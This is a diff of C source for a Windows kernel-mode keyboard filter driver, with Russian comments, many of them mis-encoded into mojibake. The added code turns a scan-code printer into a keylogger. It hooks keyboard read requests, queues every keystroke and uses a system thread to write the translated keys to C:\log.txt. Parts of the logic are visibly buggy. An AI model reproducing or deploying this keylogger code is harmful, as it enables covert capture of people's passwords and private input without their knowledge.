@@ -1,207 +1,426 @@
-#include <ntddk.h>
-//#include <wdf.h>
+п»ї#include "Source.h"
+#include "ScanCodes.h"
 
-
-//В этом простом примере мы использовали также директивы #pragma alloc_text(INIT, DriverEntry) и #pragma alloc_text(PAGE, UnloadRoutine). Объясню что они означают: первая помещает функцию DriverEntry в INIT секцию, то есть как бы говорит, что DriverEntry будет выполнена один раз и после этого код функции можно спокойно выгрузить из памяти. Вторая помечает код функции UnloadRoutine как выгружаемый, т.е. при необходимости, система может переместить его в файл подкачки, а потом забрать его оттуда.
-
-/*
-VOID Unload(IN PDRIVER_OBJECT pDriverObject);
-NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
-
-#pragma alloc_text(INIT, DriverEntry)
-#pragma alloc_text(PAGE, Unload)
-*/
-
-/*
-typedef struct _DEVICE_EXTENSION { PDEVICE_OBJECT pKeyboardDevice;
-									PETHREAD pThreadObj;
-									bool bhThreadTerminate;
-									HANDLE hLogFile;
-									KEY_STATE kState;
-									KSEMAPHORE semQueue;
-									KSPIN_LOCK lockQueue;
-									LIST_ENTRY QueueListHead;
-									} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
-*/
-
-//Структура соответствует нажатой клавише
-typedef struct _KEYBOARD_INPUT_DATA { 
-									USHORT UnitId;
-									USHORT MakeCode;
-									USHORT Flags;
-									USHORT Reserved;
-									ULONG ExtraInformation;
-									} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
-
-
-typedef struct _DEVICE_EXTENSION {
-	PDEVICE_OBJECT pKeyboardDevice;
-} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
-
-LONG64 volatile REQUESTS; //число незавершённых запросов
+static int REQUESTS = 0; //С‡РёСЃР»Рѕ РЅРµР·Р°РІРµСЂС€С‘РЅРЅС‹С… Р·Р°РїСЂРѕСЃРѕРІ
 
 NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 {
-	//PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
-
-	PKEYBOARD_INPUT_DATA keys;
-
-	//Проверка завершения запроса
+	DbgPrint("Entering ReadCompleted\n");
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
+	
+	//РџСЂРѕРІРµСЂСЏРµРј СЃС‚Р°С‚СѓСЃ Р·Р°РїСЂРѕСЃР° (РїР°РєРµС‚Р°) 
 	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
 	{
-		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
-		//Получаем количество букв
+		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
+		//РџРѕР»СѓС‡Р°РµРј РєРѕР»РёС‡РµСЃС‚РІРѕ Р±СѓРєРІ
 		int nKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
-
-		//Вывод каждой
 		for (int i = 0; i < nKeys; ++i)
 		{
-			DbgPrint("Code: %x\n", keys[i].MakeCode);
+			//Р•СЃР»Рё РєР»Р°РІРёС€Р° РЅР°Р¶Р°С‚Р°
+			//??? CHANGED!! was Break!
+			//if (keys[i].Flags == KEY_MAKE)
+			//{
+				
+				DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
+
+				if (keys[i].Flags == KEY_BREAK)
+					DbgPrint("%s\n", "Key Up");
+
+				if (keys[i].Flags == KEY_MAKE)
+					DbgPrint("%s\n", "Key Down");
+				//Р’С‹РґРµР»СЏРµРј РїСѓР» РЅРµРїРµСЂРµРјРµС‰Р°РµРјРѕР№ РїР°РјСЏС‚Рё Рё РїРѕРјРµС‰Р°РµРј РµРіРѕ РІ СЃРїРёСЃРѕРє
+				KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
+				kData->keyData = (char)keys[i].MakeCode;
+				kData->keyFlags = (char)keys[i].Flags;
+				//Р”РѕР±Р°РІР»СЏРµРј СЃРєР°РЅ РєРѕРґ РІ СЃРїРёСЃРѕРє
+				//Р’СЃС‚Р°РІР»СЏРµРј СѓР·РµР» РІ РєРѕРЅРµС† СЃРїРёСЃРєР°
+				ExInterlockedInsertTailList(&pDeviceExtension->listHead,
+					&kData->listNode,
+					&pDeviceExtension->spinlock);
+				//РЈРІРµР»РёС‡РёРІР°РµРј СЃС‡С‘С‚С‡РёРє СЃРµРјР°С„РѕСЂР° РЅР° 1
+				KeReleaseSemaphore(&pDeviceExtension->semaphore,
+					0,
+					1,
+					FALSE);
+				
+			//}
 		}
 	}
 
-	//Если IRP задержан
+	//Р•СЃР»Рё IRP Р·Р°РґРµСЂР¶Р°РЅ
 	if (pIrp->PendingReturned)
-	{
 		IoMarkIrpPending(pIrp);
-		InterlockedDecrement64(&REQUESTS);
-	}
-
+	--REQUESTS;
+	DbgPrint("RC\t%d\n", REQUESTS);
 	return pIrp->IoStatus.Status;
-
 }
 
 NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
 	DbgPrint("Entering dispatchskip\n");
-	//Отправляем IRP пакет ниже по стеку, не изменяя его
+	//РћС‚РїСЂР°РІР»СЏРµРј IRP РїР°РєРµС‚ РЅРёР¶Рµ РїРѕ СЃС‚РµРєСѓ, РЅРµ РёР·РјРµРЅСЏСЏ РµРіРѕ
 	IoSkipCurrentIrpStackLocation(pIrp);
 	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
 }
 
-//Обработка запросов на чтение
+//РћР±СЂР°Р±РѕС‚РєР° Р·Р°РїСЂРѕСЃРѕРІ РЅР° С‡С‚РµРЅРёРµ
 NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
-	//Настраиваем указатель стека для нижележащего драйвера
+	DbgPrint("Entering DispatchRead\n");
+
+	
+	//РќР°СЃС‚СЂР°РёРІР°РµРј С‚РµРєСѓС‰РёР№ СѓРєР°Р·Р°С‚РµР»СЊ СЃС‚РµРєР° С‚Р°Рє, С‡С‚РѕР±С‹ РѕРЅ СѓРєР°Р·С‹РІР°Р» РЅР° РѕР±Р»Р°СЃС‚СЊ РїР°РјСЏС‚Рё РЅРёР¶РµР»РµР¶Р°С‰РµРіРѕ РґСЂР°Р№РІРµСЂР°
 	IoCopyCurrentIrpStackLocationToNext(pIrp);
 
-	//По выполнении запроса вызываем указанную функцию
-	IoSetCompletionRoutine(pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);
+	//РџРѕ РІС‹РїРѕР»РЅРµРЅРёРё Р·Р°РїСЂРѕСЃР° РІС‹Р·С‹РІР°РµРј СѓРєР°Р·Р°РЅРЅСѓСЋ С„СѓРЅРєС†РёСЋ
+	IoSetCompletionRoutineEx(pDeviceObject, pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);
 
-	InterlockedIncrement64(&REQUESTS);
+	//РЈРІРµР»РёС‡РёРІР°РµРј РєРѕР»РёС‡РµСЃС‚РІРѕ Р·Р°РїСЂРѕСЃРѕРІ
+	++REQUESTS;
+	DbgPrint("DR \t%d\n", REQUESTS);
 
-	//Передаём IRP следующему драйверу
+	//РџРµСЂРµРґР°С‘Рј IRP-РїР°РєРµС‚ СЃР»РµРґСѓСЋС‰РµРјСѓ РґСЂР°Р№РІРµСЂСѓ
+	//pKeyboardDevice - СѓРєР°Р·Р°С‚РµР»СЊ РЅР° СЃР»РµРґСѓСЋС‰РёР№ РґСЂР°Р№РІРµСЂ РІ С†РµРїРѕС‡РєРµ
 	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
-
 }
 
-
-//Функция выгрузки драйвера
+//Р¤СѓРЅРєС†РёСЏ РІС‹РіСЂСѓР·РєРё РґСЂР°Р№РІРµСЂР°
 VOID Unload(PDRIVER_OBJECT pDriverObject) 
 {
-	//Получаем указатель на PDEVICE_EXTENSION
-	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+	//ReadCompleted()
+	DbgPrint("Entering unload\n");
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
 
-	//Убираем устройство из стэка
-	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
+	//РЈР±РёСЂР°РµРј СѓСЃС‚СЂРѕР№СЃС‚РІРѕ РёР· СЃС‚РµРєР°
+	IoDetachDevice(pDeviceExtension->pKeyboardDevice);
 	
-	//Ожидаем, пока закончатся все IRP пакеты
-	if (REQUESTS != 0)
+	//РћР¶РёРґР°РµРј РѕРєРѕРЅС‡Р°РЅРёРµ РѕР±СЂР°Р±РѕС‚РєРё РїР°РєРµС‚РѕРІ
+	KTIMER timer;
+	LARGE_INTEGER timeout;
+	timeout.QuadPart = 1000000; // 0,1 c
+	KeInitializeTimer(&timer);
+	DbgPrint("1st point\n");
+	DbgPrint("UL\t%d\n", REQUESTS);
+	while (REQUESTS > 0)
 	{
-		DbgPrint("Waiting timer\n");
-		KTIMER timer;
-		LARGE_INTEGER timeout;
-		timeout.QuadPart = 1000000; // 0,1 c
-		KeInitializeTimer(&timer);
-
-		while (REQUESTS > 0)
-		{
-			KeSetTimer(&timer, timeout, NULL);
-			KeWaitForSingleObject(&timer, Executive, KernelMode, FALSE, NULL);
-		}
+		KeSetTimer(&timer, timeout, NULL);
+		KeWaitForSingleObject(&timer,
+							Executive,
+							KernelMode,
+							FALSE,
+							NULL);
 	}
-	
-	//Удаляем устройство
+	DbgPrint("2nd point\n");
+	//РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј С„Р»Р°Рі Р·Р°РІРµСЂС€РµРЅРёСЏ РїРѕС‚РѕРєР° Рё РѕСЃРІРѕР±РѕР¶РґР°РµРј СЃРµРјР°С„РѕСЂ
+	pDeviceExtension->bClosedThread = TRUE;
+	KeReleaseSemaphore(&pDeviceExtension->semaphore,
+						0,
+						1,
+						TRUE);
+	DbgPrint("3rd point\n");
+	//Р–РґС‘Рј СѓРЅРёС‡С‚РѕР¶РµРЅРёСЏ РїРѕС‚РѕРєР°
+	KeWaitForSingleObject(pDeviceExtension->pThreadObj,
+		Executive,
+		KernelMode,
+		FALSE,
+		NULL);
+	DbgPrint("4th point\n");
+	//Р—Р°РєСЂС‹РІР°РµРј С„Р°Р№Р»
+	ZwClose(pDeviceExtension->hLog);
+	DbgPrint("5th point\n");
+	//РЈРґР°Р»СЏРµРј СѓСЃС‚СЂРѕР№СЃС‚РІРѕ
 	IoDeleteDevice(pDriverObject->DeviceObject);
+	DbgPrint("6th point\n");
 	return;
 }
 
-//Установка фильтра
-NTSTATUS KeyboardFilter(PDRIVER_OBJECT pDriverObject) 
+//РЈСЃС‚Р°РЅРѕРІРєР° С„РёР»СЊС‚СЂР°
+NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject)
 {
-	//Объект устройства
-	PDEVICE_OBJECT pKeyboardDeviceObject;
+	PDEVICE_OBJECT pDeviceObject;
 	NTSTATUS NtStatus = 0;
 
-	//Создаём объект устройства (Driver object) 
+	//РЎРѕР·РґР°С‘Рј РѕР±СЉРµРєС‚ СѓСЃС‚СЂРѕР№СЃС‚РІР°
 	NtStatus = IoCreateDevice(pDriverObject,
-		sizeof(DEVICE_EXTENSION),
-		NULL,
-		FILE_DEVICE_KEYBOARD,	//Тип устройства
-		0,
-		TRUE, //FALSE
-		&pKeyboardDeviceObject);
+							sizeof(DEVICE_EXTENSION),
+							NULL,
+							FILE_DEVICE_KEYBOARD,	//РўРёРї СѓСЃС‚СЂРѕР№СЃС‚РІР°
+							0,
+							TRUE, //FALSE
+							&pDeviceObject);
 
-	//Устройство создано
-	if (NtStatus == STATUS_SUCCESS)
-	{
-		//Установка флагов
-		pKeyboardDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
-		pKeyboardDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
-
-		//Обнуляем струтуру DeviceExtension
-		RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
-		PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
-
-		//Преобразование имени устройства
-		CCHAR cName[40] = "\\Device\\KeyboardClass0";
-		STRING strName;
-		UNICODE_STRING ustrDeviceName;
-
-		RtlInitAnsiString(&strName, cName);
-		RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);
-
-		//Добавляем устройство в стек
-		//В &pKeyboardDeviceExtension->pKeyboardDevice хранится адрес нижележащего устройства
-		IoAttachDevice(pKeyboardDeviceObject, &ustrDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
-		//Освобождаем место, выделенное под строку
-		RtlFreeUnicodeString(&ustrDeviceName);		
-		DbgPrint("Keyboard filter installed\n");
-	}
-	else
-	{
+	//РЈСЃС‚СЂРѕР№СЃС‚РІРѕ СЃРѕР·РґР°РЅРѕ
+	if (NtStatus != STATUS_SUCCESS) {
 		DbgPrint("Installing keyboard filter error\n");
+		return NtStatus;
 	}
+	//РЈСЃС‚Р°РЅРѕРІРєР° С„Р»Р°РіРѕРІ
+	pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
+	pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
 
+	//РћР±РЅСѓР»СЏРµРј СЃС‚СЂСѓС‚СѓСЂСѓ DeviceExtension
+	RtlZeroMemory(pDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
+	//РџРѕР»СѓС‡Р°РµРј СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РІС‹РґРµР»РµРЅРЅСѓСЋ РїР°РјСЏС‚СЊ
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
+
+	//РџСЂРµРѕР±СЂР°Р·РѕРІР°РЅРёРµ РёРјРµРЅРё СѓСЃС‚СЂРѕР№СЃС‚РІР°
+	CCHAR cName[40] = "\\Device\\KeyboardClass0";
+	STRING strName;
+	UNICODE_STRING ustrDeviceName;
+
+	RtlInitAnsiString(&strName, cName);
+	RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);
+
+	//Р”РѕР±Р°РІР»СЏРµРј СѓСЃС‚СЂРѕР№СЃС‚РІРѕ РІ СЃС‚РµРє
+	//Р’ &pKeyboardDeviceExtension->pKeyboardDevice С…СЂР°РЅРёС‚СЃСЏ Р°РґСЂРµСЃ РЅРёР¶РµР»РµР¶Р°С‰РµРіРѕ СѓСЃС‚СЂРѕР№СЃС‚РІР°
+	IoAttachDevice(pDeviceObject, &ustrDeviceName, &pDeviceExtension->pKeyboardDevice);
+	//РћСЃРІРѕР±РѕР¶РґР°РµРј РјРµСЃС‚Рѕ, РІС‹РґРµР»РµРЅРЅРѕРµ РїРѕРґ СЃС‚СЂРѕРєСѓ
+	RtlFreeUnicodeString(&ustrDeviceName);		
+	DbgPrint("Keyboard filter installed\n");
 	return NtStatus;
 }
 
+VOID ThreadForWriting(PVOID pContext)
+{
+	//??? P_DEVICE_OBJ?
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pContext;
+	PDEVICE_OBJECT pDeviceObject = pDeviceExtension->pKeyboardDevice;
+	PLIST_ENTRY pListEntry;
+	KEY_DATA* kData;
 
-//Входная точка
-//PDRIVER_OBJECT - адрес объекта драйвера
-//PUNICODE_STRING - путь в реестре к подразделу драйвера
+	while (TRUE)
+	{
+		//Р–РґС‘Рј РѕСЃРІРѕР±РѕР¶РґРµРЅРёСЏ СЃРµРјР°С„РѕСЂР°
+		//Р•СЃР»Рё СЃРµРјР°С„РѕСЂ РЅРµРЅСѓР»РµРІРѕР№, РїСЂРѕС†РµСЃСЃ РїСЂРѕРґРѕР»Р¶Р°РµС‚ СЃРІРѕСЋ СЂР°Р±РѕС‚Сѓ
+		KeWaitForSingleObject(&pDeviceExtension->semaphore,
+			Executive,
+			KernelMode,
+			FALSE,
+			NULL);
+		//РР·РІР»РµРєР°РµРј РїРµСЂРІС‹Р№ СЌР»РµРјРµРЅС‚ СЃРїРёСЃРєР°
+		//?? РСЃРїРѕР»СЊР·СѓРµС‚СЃСЏ РєСЂРёС‚РёС‡РµСЃРєР°СЏ СЃРµРєС†РёСЏ
+		pListEntry = ExInterlockedRemoveHeadList(&pDeviceExtension->listHead,
+												&pDeviceExtension->spinlock);
+		//Р”РѕР»Р¶РµРЅ Р»Рё РїРѕС‚РѕРє СѓРЅРёС‡С‚РѕР¶РёС‚СЊ СЃРµР±СЏ?
+		if (pDeviceExtension->bClosedThread == TRUE)
+		{
+			PsTerminateSystemThread(STATUS_SUCCESS);
+		}
+		//РџРѕР»СѓС‡Р°РµРј СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РґР°РЅРЅС‹Рµ РІ СЃС‚СЂСѓРєС‚СѓСЂРµ pListEntry ???
+		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, listNode);
+		//РџСЂРµРѕР±СЂР°Р·СѓРµРј СЃРєР°РЅРєРѕРґ РІ РєР»Р°РІРёС€Сѓ
+		///??? {0}
+
+		//Convert the scan code to a key code
+		char keys[3] = { 0 };
+		Scancode2Key(kData->keyData, keys);
+
+		if (keys != 0)
+		{
+			//Р•СЃР»Рё С…СЌРЅРґР» РїСЂР°РІРёР»СЊРЅС‹Р№
+			if (pDeviceExtension->hLog != NULL)
+			{
+				//Р—Р°РїРёСЃС‹РІР°РµРј РІ С„Р°Р№Р»
+				IO_STATUS_BLOCK ioStatus;
+				NTSTATUS NtStatus = ZwWriteFile(
+					pDeviceExtension->hLog,
+					NULL,
+					NULL,
+					NULL,
+					&ioStatus,
+					&keys,
+					strlen(keys),
+					NULL,
+					NULL);
+				//Error??
+				if (NtStatus != STATUS_SUCCESS)
+					DbgPrint("Writing scancode to file\n");
+				else
+					DbgPrint("Scan code successfully written\n");
+			}
+		}
+		//??? added to break infinite loop in the end
+		//--REQUESTS;
+		DbgPrint("TFW\t%d\n", REQUESTS);
+
+	}
+	return;
+}
+
+//Р¤СѓРЅРєС†РёСЏ РёРЅРёС†РёР°Р»РёР·Р°С†РёРё РїРѕС‚РѕРєР°
+NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
+{
+	//PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+
+	//РРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј РїРµСЂРµРјРµРЅРЅСѓСЋ, РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° СЂР°Р±РѕС‚Сѓ РїРѕС‚РѕРєР°
+	pDeviceExtension->bClosedThread = FALSE;
+	//РЎРѕР·РґР°С‘Рј РїРѕС‚РѕРє
+	HANDLE hThread;
+	NTSTATUS NtStatus = PsCreateSystemThread(&hThread,
+											(ACCESS_MASK)0,
+											NULL,
+											(HANDLE)0,
+											NULL,
+											ThreadForWriting,
+											pDeviceExtension);
+	if (NtStatus != STATUS_SUCCESS) {
+		DbgPrint("Thread initializing error\n");
+		return NtStatus;
+	}
+	//РЎРѕС…СЂР°РЅСЏРµРј СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РѕР±СЉРµРєС‚ РїРѕС‚РѕРєР° РІ СЃС‚СЂСѓРєС‚СѓСЂРµ DEVICE_EXTENSION
+	ObReferenceObjectByHandle(hThread,
+							THREAD_ALL_ACCESS,
+							NULL,
+							KernelMode,
+							(PVOID*)&pDeviceExtension->pThreadObj, //РЈРєР°Р·Р°С‚РµР»СЊ РЅР° РѕР±СЉРµРєС‚ РїРѕС‚РѕРєР°
+							NULL);
+
+	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",
+		&pDeviceExtension->pThreadObj);
+
+	//??? Р—Р°РєСЂС‹РІР°РµРј РґРµСЃРєСЂРёРїС‚РѕСЂ РїРѕС‚РѕРєР°
+	ZwClose(hThread);
+	DbgPrint("Thread initialized\n");
+	return NtStatus;
+	
+}
+
+
+NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject)
+{
+	NTSTATUS NtStatus = 0;
+	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+	
+	//РЎРѕР·РґР°С‘Рј РґРІСѓСЃРІСЏР·РЅС‹Р№ СЃРїРёСЃРѕРє
+	InitializeListHead(&pDeviceExtension->listHead);
+	//РРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃРїРёРЅР»РѕРє Рё СЃРµРјР°С„РѕСЂ
+	KeInitializeSpinLock(&pDeviceExtension->spinlock);
+	KeInitializeSemaphore(&pDeviceExtension->semaphore, 0, MAXLONG);
+
+	//РћРїСЂРµРґРµР»СЏРµРј Р°С‚С‚СЂРёР±СѓС‚С‹ Рё РїСѓС‚СЊ Рє С„Р°Р№Р»Сѓ
+	IO_STATUS_BLOCK fileStatus;
+	OBJECT_ATTRIBUTES objAttr;
+
+	CCHAR cName[64] = "\\DosDevices\\C:\\log.txt";
+	STRING strName;
+	UNICODE_STRING ustrFileName;
+
+	RtlInitAnsiString(&strName, cName);
+	RtlAnsiStringToUnicodeString(&ustrFileName, &strName, TRUE);
+
+	InitializeObjectAttributes(&objAttr,
+								&ustrFileName,
+								OBJ_CASE_INSENSITIVE,
+								NULL,
+								NULL);
+	//РЎРѕР·РґР°С‘Рј С„Р°Р№Р»
+	NtStatus = ZwCreateFile(&pDeviceExtension->hLog,
+							GENERIC_WRITE,
+							&objAttr,
+							&fileStatus,
+							NULL,
+							FILE_ATTRIBUTE_NORMAL,
+							0,
+							FILE_OPEN_IF,
+							FILE_SYNCHRONOUS_IO_NONALERT,
+							NULL,
+							0);
+
+	//РћСЃРІРѕР±РѕР¶РґР°РµРј РїР°РјСЏС‚СЊ, РІС‹РґРµР»РµРЅРЅСѓСЋ РїРѕРґ СЃС‚СЂРѕРєСѓ
+	RtlFreeUnicodeString(&ustrFileName);
+
+	if (NtStatus == STATUS_SUCCESS)
+	{
+		DbgPrint("File was successfully created\n");
+	}
+	else
+	{
+		DbgPrint("Failed to create file\n");
+	}
+	return NtStatus;
+
+}
+
+char* Scancode2Key(char scanCode, char* keys)
+{
+	char key;
+	BOOLEAN lShift = 0;
+	BOOLEAN rShift = 0;
+	BOOLEAN space = 0;
+	BOOLEAN ctrl = 0;
+	BOOLEAN alt = 0;
+
+	key = lowerKeys[scanCode];
+	switch(key)
+	{
+		case LSHIFT:
+			lShift = TRUE;
+			break;
+
+		case RSHIFT:
+			rShift = TRUE;
+			break;
+
+		case CTRL:
+			ctrl = TRUE;
+			break;
+
+		case ALT:
+			alt = TRUE;
+
+		case SPACE:
+			space = TRUE;
+			break;
+
+		case ENTER:
+			keys[0] = 0x0D;
+			keys[1] = 0x0A;
+			break;
+
+		default:
+			if (lShift == TRUE || rShift == TRUE)
+				keys[0] = upperKeys[scanCode];
+			else
+				keys[0] = lowerKeys[scanCode];
+	}
+	return keys;
+}
+
+//Р’С…РѕРґРЅР°СЏ С‚РѕС‡РєР°
+//PDRIVER_OBJECT - Р°РґСЂРµСЃ РѕР±СЉРµРєС‚Р° РґСЂР°Р№РІРµСЂР°
+//PUNICODE_STRING - РїСѓС‚СЊ РІ СЂРµРµСЃС‚СЂРµ Рє РїРѕРґСЂР°Р·РґРµР»Сѓ РґСЂР°Р№РІРµСЂР°
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
-	REQUESTS = 0;
+	DbgPrint("Entering driver entry point\n");
+	//REQUESTS = 0;
+	DbgPrint("EP= %d", REQUESTS);
 	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
-	unsigned int uiIndex = 0;
+	unsigned int i = 0;
 
-	//Регистрация драйвером точек входа в свои рабочие процедуры
-	for (uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; ++uiIndex)
+	//РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј РѕР±СЂР°Р±РѕС‚С‡РёРє Р·Р°РїСЂРѕСЃРѕРІ РїРѕ СѓРјРѕР»С‡Р°РЅРёСЋ 
+	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
 	{
-		//Отправляем IRP пакет ниже
-		pDriverObject->MajorFunction[uiIndex] = DispatchSkip;
+		//РћС‚РїСЂР°РІР»СЏРµРј IRP РїР°РєРµС‚ РЅРёР¶Рµ
+		pDriverObject->MajorFunction[i] = DispatchSkip;
 	}
-	//Перехватываем IRP_MJ_READ
+	//РџРµСЂРµС…РІР°С‚С‹РІР°РµРј Р·Р°РїСЂРѕСЃС‹ РЅР° С‡С‚РµРЅРёРµ РєР»Р°РІРёР°С‚СѓСЂС‹
 	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
 
-	//DbgPrint("Entering hook routine\n");
-	//Помещаем наше устройство в стэк
-	NtStatus = KeyboardFilter(pDriverObject);
+	//РџРѕРјРµС‰Р°РµРј РЅР°С€Рµ СѓСЃС‚СЂРѕР№СЃС‚РІРѕ РІ СЃС‚РµРє.
+	NtStatus = InitializeKeyboardFilter(pDriverObject);
 
-	//Функция выгрузки драйвера из памяти
+	//РџРѕСЃРєРѕР»СЊРєСѓ РЅР° СѓСЂРѕРІРЅРµ IRQL == DISPATCH_LEVEL Р·Р°РїСЂРµС‰РµРЅС‹ РѕРїРµСЂР°С†РёРё РІРІРѕРґР°/РІС‹РІРѕРґР°,
+	//С‚Рѕ РЅРµРѕР±С…РѕРґРёРјРѕ СЃРѕР·РґР°С‚СЊ РїРѕС‚РѕРє, СЂР°Р±РѕС‚Р°СЋС‰РёР№ РЅР° IRQL СѓСЂРѕРІРЅРµ - PASSIVE_LEVEL  
+	NtStatus |= InitializeThread(pDriverObject);
+
+	//РЎРѕР·РґР°С‘Рј С„Р°Р№Р» РґР»СЏ Р·Р°РїРёСЃРё
+	NtStatus |= CreateFile(pDriverObject);
+
+	//Р¤СѓРЅРєС†РёСЏ РІС‹РіСЂСѓР·РєРё РґСЂР°Р№РІРµСЂР° РёР· РїР°РјСЏС‚Рё
 	pDriverObject->DriverUnload = Unload;
 
+	DbgPrint("Exiting driver entry point\n");
 	return NtStatus;
 }
 
